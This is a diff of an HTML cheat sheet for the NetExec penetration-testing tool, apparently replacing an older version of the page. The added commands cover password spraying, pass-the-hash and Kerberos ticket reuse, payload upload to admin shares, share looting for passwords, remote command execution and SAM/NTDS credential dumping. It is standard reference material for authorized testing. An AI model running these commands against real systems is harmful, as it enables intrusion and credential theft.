 <h2 id="core-syntax">Core Syntax<a class="headerlink" href="#core-syntax" title="Permanent link">&para;</a></h2>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>nxc<span class="w"> </span>&lt;protocol&gt;<span class="w"> </span>&lt;target<span class="o">(</span>s<span class="o">)</span>&gt;<span class="w"> </span><span class="o">[</span>flags<span class="o">]</span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>nxc<span class="w"> </span>&lt;protocol&gt;<span class="w"> </span>&lt;target&gt;<span class="w"> </span><span class="o">[</span>auth<span class="o">]</span><span class="w"> </span><span class="o">[</span>action<span class="o">]</span>
 </code></pre></div>
-<h3 id="protocols">Protocols:<a class="headerlink" href="#protocols" title="Permanent link">&para;</a></h3>
-<ul>
-<li><code>smb</code> – Server Message Block (Windows file shares)</li>
-<li><code>winrm</code> – Remote Windows PowerShell</li>
-<li><code>ldap</code> – AD user/group enumeration</li>
-<li><code>kerberos</code> – For TGT/TGS ticket hunting (w/ <code>--kerberos</code>)</li>
-<li><code>mssql</code>, <code>rdp</code>, <code>ssh</code>, <code>ftp</code>, <code>http</code>, <code>imap</code> – Available via modules</li>
-</ul>
+<div class="admonition tip">
+<p class="admonition-title">Non-standard Port</p>
+<p>Found a service running on a non-standard port? Use <code>--port x</code> to specify the port of the target.
+Example: <code>nxc ftp -u user.list -p pass.list --port 2121</code></p>
+</div>
+<p>Common target forms:</p>
+<table>
+<thead>
+<tr>
+<th>Target type</th>
+<th>Example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Single host</td>
+<td><code>nxc smb 10.10.10.10</code></td>
+</tr>
+<tr>
+<td>CIDR range</td>
+<td><code>nxc smb 10.10.10.0/24</code></td>
+</tr>
+<tr>
+<td>IP range</td>
+<td><code>nxc smb 10.10.10.10-50</code></td>
+</tr>
+<tr>
+<td>FQDN</td>
+<td><code>nxc smb dc01.corp.local</code></td>
+</tr>
+<tr>
+<td>Target file</td>
+<td><code>nxc smb targets.txt</code></td>
+</tr>
+<tr>
+<td>Nmap XML</td>
+<td><code>nxc smb scan.xml</code></td>
+</tr>
+</tbody>
+</table>
+<p>Common protocols and usage:</p>
+<table>
+<thead>
+<tr>
+<th>Protocol</th>
+<th>Use for</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>smb</code></td>
+<td>Windows host checks, shares, local-admin validation, command execution, host credential dumping.</td>
+</tr>
+<tr>
+<td><code>ldap</code></td>
+<td>AD object enumeration, policy checks, roasting, BloodHound collection, LDAP queries.</td>
+</tr>
+<tr>
+<td><code>winrm</code></td>
+<td>WinRM auth validation, remote command execution, file transfer, host credential dumping over WinRM.</td>
+</tr>
+<tr>
+<td><code>mssql</code></td>
+<td>SQL auth, Windows auth to SQL Server, queries, <code>xp_cmdshell</code>, linked-server checks.</td>
+</tr>
+<tr>
+<td><code>rdp</code></td>
+<td>RDP auth checks and screenshots.</td>
+</tr>
+<tr>
+<td><code>ssh</code></td>
+<td>SSH auth checks, command execution, sudo checks, file transfer.</td>
+</tr>
+<tr>
+<td><code>ftp</code></td>
+<td>FTP auth checks, listing, upload, download.</td>
+</tr>
+<tr>
+<td><code>nfs</code></td>
+<td>NFS share enumeration and file operations.</td>
+</tr>
+<tr>
+<td><code>wmi</code></td>
+<td>WMI auth checks and command execution.</td>
+</tr>
+<tr>
+<td><code>vnc</code></td>
+<td>VNC auth checks and screenshots.</td>
+</tr>
+</tbody>
+</table>
+<p>Syntax checkpoints:</p>
+<table>
+<thead>
+<tr>
+<th>Need</th>
+<th>Use</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Target file</td>
+<td><code>nxc smb targets.txt</code></td>
+</tr>
+<tr>
+<td>LDAP over TLS</td>
+<td><code>nxc ldap &lt;target&gt; --port 636</code></td>
+</tr>
+<tr>
+<td>Kerberos auth</td>
+<td>Add <code>-k</code>, <code>--use-kcache</code>, or <code>--aesKey</code> to a supported protocol.</td>
+</tr>
+<tr>
+<td>Command execution</td>
+<td><code>-x</code> for cmd.exe, <code>-X</code> for PowerShell.</td>
+</tr>
+<tr>
+<td>Leading-dash creds</td>
+<td><code>-u='-svc' -p='-Password123!'</code></td>
+</tr>
+</tbody>
+</table>
 <hr />
-<h2 id="authentication-methods">Authentication Methods<a class="headerlink" href="#authentication-methods" title="Permanent link">&para;</a></h2>
+<h2 id="authentication">Authentication<a class="headerlink" href="#authentication" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span>alice<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Winter2026!&#39;</span><span class="w"> </span>-d<span class="w"> </span>corp.local
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span>Administrator<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Password1!&#39;</span><span class="w"> </span>--local-auth
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span>alice<span class="w"> </span>-H<span class="w"> </span>&lt;ntlm-hash&gt;
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-id<span class="w"> </span><span class="m">7</span>
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-u &lt;user&gt;</code></td>
+<td>Username, local account name, or user list.</td>
+</tr>
+<tr>
+<td><code>-p &lt;password&gt;</code></td>
+<td>Password or password list.</td>
+</tr>
+<tr>
+<td><code>-d &lt;domain&gt;</code></td>
+<td>Domain context for AD auth.</td>
+</tr>
+<tr>
+<td><code>--local-auth</code></td>
+<td>Authenticate against the target's local SAM instead of the domain.</td>
+</tr>
+<tr>
+<td><code>-H &lt;ntlm-hash&gt;</code></td>
+<td>Pass-the-hash; NT hash alone is enough.</td>
+</tr>
+<tr>
+<td><code>-id &lt;cred-id&gt;</code></td>
+<td>Pull a saved credential from <code>nxcdb</code>.</td>
+</tr>
+<tr>
+<td><code>-u '' -p ''</code></td>
+<td>Null-session check where anonymous auth is in scope.</td>
+</tr>
+</tbody>
+</table>
+<h3 id="kerberos">Kerberos<a class="headerlink" href="#kerberos" title="Permanent link">&para;</a></h3>
+<p>Use FQDN targets for Kerberos. Fix DNS first; most "Kerberos is broken" failures are name-resolution or SPN failures.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span>dc01.corp.local<span class="w"> </span>-u<span class="w"> </span>alice<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Winter2026!&#39;</span><span class="w"> </span>-k<span class="w"> </span>-d<span class="w"> </span>corp.local<span class="w"> </span>--dns-server<span class="w"> </span><span class="m">10</span>.10.10.10
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>/loot/alice.ccache
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>nxc<span class="w"> </span>smb<span class="w"> </span>dc01.corp.local<span class="w"> </span>--use-kcache
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>nxc<span class="w"> </span>smb<span class="w"> </span>dc01.corp.local<span class="w"> </span>-u<span class="w"> </span>alice<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Winter2026!&#39;</span><span class="w"> </span>-d<span class="w"> </span>corp.local<span class="w"> </span>--generate-tgt<span class="w"> </span>alice.ccache
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-k</code></td>
+<td>Request Kerberos auth for the selected protocol.</td>
+</tr>
+<tr>
+<td><code>--use-kcache</code></td>
+<td>Reuse the current <code>KRB5CCNAME</code> ccache.</td>
+</tr>
+<tr>
+<td><code>--aesKey &lt;aes256-key&gt;</code></td>
+<td>Authenticate with an AES Kerberos key.</td>
+</tr>
+<tr>
+<td><code>--generate-tgt &lt;file&gt;</code></td>
+<td>Generate a TGT ccache for later reuse.</td>
+</tr>
+<tr>
+<td><code>--kdcHost &lt;dc-fqdn&gt;</code></td>
+<td>Pin the KDC when DNS or SPN resolution is fragile.</td>
+</tr>
+<tr>
+<td><code>--dns-server &lt;ip&gt;</code></td>
+<td>Send name resolution to the target DNS server.</td>
+</tr>
+<tr>
+<td><code>--port 636</code></td>
+<td>Use LDAPS with <code>nxc ldap</code>.</td>
+</tr>
+</tbody>
+</table>
+<p>For LDAP Kerberos, pin the KDC when name resolution is fragile:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>nxc<span class="w"> </span>ldap<span class="w"> </span>dc01.corp.local<span class="w"> </span>-u<span class="w"> </span>alice<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Winter2026!&#39;</span><span class="w"> </span>-k<span class="w"> </span>-d<span class="w"> </span>corp.local<span class="w"> </span>--kdcHost<span class="w"> </span>dc01.corp.local<span class="w"> </span>--dns-server<span class="w"> </span><span class="m">10</span>.10.10.10
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>nxc<span class="w"> </span>ldap<span class="w"> </span>dc01.corp.local<span class="w"> </span>--use-kcache<span class="w"> </span>--kdcHost<span class="w"> </span>dc01.corp.local
+</code></pre></div>
+<h3 id="certificates">Certificates<a class="headerlink" href="#certificates" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span>dc01.corp.local<span class="w"> </span>--pfx-cert<span class="w"> </span>alice.pfx<span class="w"> </span>--pfx-pass<span class="w"> </span><span class="s1">&#39;pfx-password&#39;</span><span class="w"> </span>-u<span class="w"> </span>alice
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>nxc<span class="w"> </span>smb<span class="w"> </span>dc01.corp.local<span class="w"> </span>--pem-cert<span class="w"> </span>alice.pem<span class="w"> </span>--pem-key<span class="w"> </span>alice.key<span class="w"> </span>-u<span class="w"> </span>alice
+</code></pre></div>
+<p>Successful cert auth writes a ccache under <code>~/.nxc/</code>; reuse it with <code>--use-kcache</code>.</p>
+<hr />
+<h2 id="dns-helpers">DNS Helpers<a class="headerlink" href="#dns-helpers" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>nxc<span class="w"> </span>ldap<span class="w"> </span>dc01.corp.local<span class="w"> </span>-u<span class="w"> </span>alice<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;...&#39;</span><span class="w"> </span>--dns-server<span class="w"> </span><span class="m">10</span>.10.10.10
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.0/24<span class="w"> </span>-u<span class="w"> </span>alice<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;...&#39;</span><span class="w"> </span>--generate-hosts-file<span class="w"> </span>hosts.txt
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>nxc<span class="w"> </span>smb<span class="w"> </span>dc01.corp.local<span class="w"> </span>-u<span class="w"> </span>alice<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;...&#39;</span><span class="w"> </span>--generate-krb5-file<span class="w"> </span>krb5.conf
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>--dns-server &lt;ip&gt;</code></td>
+<td>Use the target DNS server for AD lookups.</td>
+</tr>
+<tr>
+<td><code>--dns-tcp</code></td>
+<td>Force TCP DNS. Useful when UDP is filtered or truncated.</td>
+</tr>
+<tr>
+<td><code>--dns-timeout &lt;seconds&gt;</code></td>
+<td>Shorten or stretch DNS waits over unreliable links.</td>
+</tr>
+<tr>
+<td><code>-6</code></td>
+<td>Use IPv6.</td>
+</tr>
+<tr>
+<td><code>--generate-hosts-file &lt;file&gt;</code></td>
+<td>Create a lab hosts file from discovered names.</td>
+</tr>
+<tr>
+<td><code>--generate-krb5-file &lt;file&gt;</code></td>
+<td>Create a Kerberos config from discovered realm/DC data.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="spraying">Spraying<a class="headerlink" href="#spraying" title="Permanent link">&para;</a></h2>
+<p>Pull policy first; lockout thresholds are not guesswork.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span>alice<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;...&#39;</span><span class="w"> </span>--pass-pol
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span>users.txt<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Spring2026!&#39;</span><span class="w"> </span>--continue-on-success
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span>users.txt<span class="w"> </span>-p<span class="w"> </span>passwords.txt<span class="w"> </span>--no-bruteforce<span class="w"> </span>--continue-on-success
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>--pass-pol</code></td>
+<td>Pull domain password and lockout policy.</td>
+</tr>
+<tr>
+<td><code>--continue-on-success</code></td>
+<td>Keep testing after a valid credential is found.</td>
+</tr>
+<tr>
+<td><code>--no-bruteforce</code></td>
+<td>Pair line 1 user with line 1 password, line 2 with line 2, etc.</td>
+</tr>
+<tr>
+<td><code>--jitter 2-5</code></td>
+<td>Add delay variance between attempts.</td>
+</tr>
+<tr>
+<td><code>--ufail-limit &lt;n&gt;</code></td>
+<td>Stop after per-user failures hit the threshold.</td>
+</tr>
+<tr>
+<td><code>--fail-limit &lt;n&gt;</code></td>
+<td>Stop after per-host failures hit the threshold.</td>
+</tr>
+<tr>
+<td><code>--gfail-limit &lt;n&gt;</code></td>
+<td>Stop after global failures hit the threshold.</td>
+</tr>
+</tbody>
+</table>
+<div class="admonition warning">
+<p class="admonition-title">Watch out</p>
+<p>Keep credential testing separate from command execution.</p>
+</div>
+<hr />
+<h2 id="smb">SMB<a class="headerlink" href="#smb" title="Permanent link">&para;</a></h2>
+<h3 id="access-check">Access Check<a class="headerlink" href="#access-check" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.0/24<span class="w"> </span>-u<span class="w"> </span>alice<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Winter2026!&#39;</span><span class="w"> </span>-d<span class="w"> </span>corp.local
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>--no-admin-check</code></td>
+<td>Skip the local-admin probe and only validate authentication.</td>
+</tr>
+</tbody>
+</table>
+<p><code>(Pwn3d!)</code> means NetExec's local-admin probe succeeded against the Service Control Manager. It is not a domain-admin signal.</p>
+<h3 id="shares-and-files">Shares And Files<a class="headerlink" href="#shares-and-files" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span>alice<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;...&#39;</span><span class="w"> </span>--shares
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;...&#39;</span><span class="w"> </span>--share<span class="w"> </span>C$<span class="w"> </span>--put-file<span class="w"> </span>./payload.exe<span class="w"> </span><span class="s1">&#39;\\Windows\\Temp\\payload.exe&#39;</span>
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;...&#39;</span><span class="w"> </span>--share<span class="w"> </span>C$<span class="w"> </span>--get-file<span class="w"> </span><span class="s1">&#39;\\Users\\alice\\Desktop\\loot.txt&#39;</span><span class="w"> </span>loot.txt
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>--shares</code></td>
+<td>List shares and access rights.</td>
+</tr>
+<tr>
+<td><code>--shares READ,WRITE</code></td>
+<td>Filter share results by permission.</td>
+</tr>
+<tr>
+<td><code>--exclude-shares C$ ADMIN$ IPC$</code></td>
+<td>Suppress noisy default shares.</td>
+</tr>
+<tr>
+<td><code>--no-write-check</code></td>
+<td>Skip write testing during share enumeration.</td>
+</tr>
+<tr>
+<td><code>--share &lt;name&gt;</code></td>
+<td>Select a share for directory listing or file operations.</td>
+</tr>
+<tr>
+<td><code>--dir &lt;path&gt;</code></td>
+<td>List a path inside the selected share.</td>
+</tr>
+<tr>
+<td><code>--put-file &lt;local&gt; &lt;remote&gt;</code></td>
+<td>Upload a file to the selected share.</td>
+</tr>
+<tr>
+<td><code>--get-file &lt;remote&gt; &lt;local&gt;</code></td>
+<td>Download a file from the selected share.</td>
+</tr>
+<tr>
+<td><code>--append-host</code></td>
+<td>Append the source host to downloaded filenames during multi-host pulls.</td>
+</tr>
+</tbody>
+</table>
+<h3 id="share-looting">Share Looting<a class="headerlink" href="#share-looting" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span>alice<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;...&#39;</span><span class="w"> </span>--spider<span class="w"> </span><span class="s1">&#39;Departments&#39;</span><span class="w"> </span>--pattern<span class="w"> </span>password<span class="w"> </span>creds<span class="w"> </span>secret<span class="w"> </span>--depth<span class="w"> </span><span class="m">5</span><span class="w"> </span>--content
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span>alice<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;...&#39;</span><span class="w"> </span>-M<span class="w"> </span>spider_plus<span class="w"> </span>-o<span class="w"> </span><span class="nv">DOWNLOAD_FLAG</span><span class="o">=</span>False<span class="w"> </span><span class="nv">EXCLUDE_FILTER</span><span class="o">=</span><span class="s1">&#39;IPC$,print$&#39;</span>
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>--spider &lt;share&gt;</code></td>
+<td>Native recursive search of a specific share.</td>
+</tr>
+<tr>
+<td><code>--pattern &lt;terms&gt;</code></td>
+<td>Match filenames or content against interesting terms.</td>
+</tr>
+<tr>
+<td><code>--depth &lt;n&gt;</code></td>
+<td>Limit recursion depth.</td>
+</tr>
+<tr>
+<td><code>--content</code></td>
+<td>Search file contents in addition to names.</td>
+</tr>
+<tr>
+<td><code>-M spider_plus</code></td>
+<td>Build a fast JSON inventory of readable shares.</td>
+</tr>
+<tr>
+<td><code>DOWNLOAD_FLAG=False</code></td>
+<td>Inventory without downloading files.</td>
+</tr>
+<tr>
+<td><code>EXCLUDE_FILTER='IPC$,print$'</code></td>
+<td>Skip low-value or noisy shares.</td>
+</tr>
+</tbody>
+</table>
+<div class="admonition warning">
+<p class="admonition-title">Watch out</p>
+<p>Enable <code>spider_plus</code> downloads only on NetExec v1.5.1 or newer; older builds had a path-traversal arbitrary file write issue.</p>
+</div>
+<h3 id="command-execution">Command Execution<a class="headerlink" href="#command-execution" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;...&#39;</span><span class="w"> </span>-x<span class="w"> </span><span class="s1">&#39;whoami /all&#39;</span>
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;...&#39;</span><span class="w"> </span>-X<span class="w"> </span><span class="s1">&#39;$PSVersionTable&#39;</span>
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-x '&lt;cmd&gt;'</code></td>
+<td>Execute through <code>cmd.exe</code>.</td>
+</tr>
+<tr>
+<td><code>-X '&lt;powershell&gt;'</code></td>
+<td>Execute through PowerShell.</td>
+</tr>
+<tr>
+<td><code>--exec-method &lt;method&gt;</code></td>
+<td>Select the remote execution backend.</td>
+</tr>
+<tr>
+<td><code>--no-output</code></td>
+<td>Execute without collecting command output.</td>
+</tr>
+<tr>
+<td><code>--codec &lt;codepage&gt;</code></td>
+<td>Decode output with a specific codepage, such as <code>cp437</code>.</td>
+</tr>
+</tbody>
+</table>
+<p>Valid <code>--exec-method</code> values: <code>wmiexec</code>, <code>mmcexec</code>, <code>smbexec</code>, <code>atexec</code>.</p>
 <table>
 <thead>
 <tr>
 <th>Method</th>
-<th>Syntax Example</th>
+<th>Field note</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td>Plaintext</td>
-<td><code>-u user -p pass</code></td>
+<td><code>wmiexec</code></td>
+<td>Default. DCOM over <code>135/tcp</code>; avoids service creation but still creates remote execution telemetry.</td>
 </tr>
 <tr>
-<td>Hashes (PTH)</td>
-<td><code>-u user -H aad3...:hash</code></td>
+<td><code>atexec</code></td>
+<td>Scheduled task execution; often survives flaky DCOM paths.</td>
 </tr>
 <tr>
-<td>Kerberos</td>
-<td><code>-k -d domain.local</code> (Requires <code>KRB5CCNAME</code> or ticket)</td>
+<td><code>smbexec</code></td>
+<td>Temporary service creation; expect Event ID 7045.</td>
 </tr>
 <tr>
-<td>AAD/SSPI (not yet supported)</td>
-<td>Work in progress (use other tools)</td>
+<td><code>mmcexec</code></td>
+<td>DCOM via MMC; useful when WMI is filtered.</td>
 </tr>
 </tbody>
 </table>
-<hr />
-<h2 id="smb-examples">SMB Examples<a class="headerlink" href="#smb-examples" title="Permanent link">&para;</a></h2>
-<h3 id="validate-credentials">Validate Credentials<a class="headerlink" href="#validate-credentials" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span>alice<span class="w"> </span>-p<span class="w"> </span>Winter2020!
+<h3 id="credential-dumping">Credential Dumping<a class="headerlink" href="#credential-dumping" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span>Administrator<span class="w"> </span>-H<span class="w"> </span>&lt;ntlm-hash&gt;<span class="w"> </span>--sam
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>nxc<span class="w"> </span>smb<span class="w"> </span>dc01.corp.local<span class="w"> </span>-u<span class="w"> </span>DA-user<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;...&#39;</span><span class="w"> </span>--ntds<span class="w"> </span>--enabled
 </code></pre></div>
-<h3 id="enumerate-shares">Enumerate Shares<a class="headerlink" href="#enumerate-shares" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span>alice<span class="w"> </span>-p<span class="w"> </span>Winter2020!<span class="w"> </span>--shares
-</code></pre></div>
-<p><strong>Expected Output:</strong></p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>[+] 10.10.10.10:445 - Found 3 accessible shares:
-<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>    - ADMIN$
-<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>    - C$
-<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>    - Public
-</code></pre></div>
-<h3 id="download-file">Download File<a class="headerlink" href="#download-file" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span>pass<span class="w"> </span>--exec<span class="w"> </span><span class="s2">&quot;get \\10.10.10.10\C</span>$<span class="s2">\Users\Public\loot.txt loot.txt&quot;</span>
-</code></pre></div>
-<h3 id="upload-file">Upload File<a class="headerlink" href="#upload-file" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span>pass<span class="w"> </span>--exec<span class="w"> </span><span class="s2">&quot;put local.exe \\10.10.10.10\C</span>$<span class="s2">\Temp\local.exe&quot;</span>
-</code></pre></div>
-<hr />
-<h2 id="remote-code-execution">Remote Code Execution<a class="headerlink" href="#remote-code-execution" title="Permanent link">&para;</a></h2>
-<h3 id="over-smb">Over SMB<a class="headerlink" href="#over-smb" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Passw0rd!&#39;</span><span class="w"> </span>-d<span class="w"> </span>DOMAIN<span class="w"> </span>--exec<span class="w"> </span><span class="s1">&#39;cmd.exe /c whoami&#39;</span>
-</code></pre></div>
-<blockquote>
-<p>Requires <code>admin</code> access (impersonates via <code>svcctl</code>, <code>wmi</code>, etc. internally)</p>
-</blockquote>
-<h3 id="over-winrm-powershell">Over WinRM (PowerShell)<a class="headerlink" href="#over-winrm-powershell" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>nxc<span class="w"> </span>winrm<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Passw0rd!&#39;</span><span class="w"> </span>-d<span class="w"> </span>domain<span class="w"> </span>--exec<span class="w"> </span><span class="s1">&#39;whoami&#39;</span>
-</code></pre></div>
-<hr />
-<h2 id="pass-the-hash-pth">Pass-the-Hash (PTH)<a class="headerlink" href="#pass-the-hash-pth" title="Permanent link">&para;</a></h2>
